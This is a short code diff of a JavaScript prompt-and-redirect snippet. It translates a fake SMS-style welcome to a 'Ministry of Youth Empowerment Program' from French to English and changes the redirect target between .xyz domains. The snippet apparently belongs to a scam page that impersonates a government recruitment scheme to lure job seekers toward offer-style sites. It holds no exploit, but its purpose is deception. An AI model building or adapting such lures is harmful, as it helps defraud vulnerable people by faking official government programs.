@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'Recrutement'
-password=prompt('SMS: Bienvenue au Programme d autonomisation du ministère de la Jeunesse, Veuillez appuyer sur OK pour continuer. ','Recrutement');
-if (password != 'Recrutement') {
-location.href='https://jeunesse-gn.offer-it.xyz/staff';
+var password = 'Recruitment'
+password=prompt('SMS: Welcome to the Ministry of Youth Empowerment Program, Please press OK to continue. ','Recruitment');
+if (password != 'Recruitment') {
+location.href='https://youth.go-career.xyz/staff';
 }
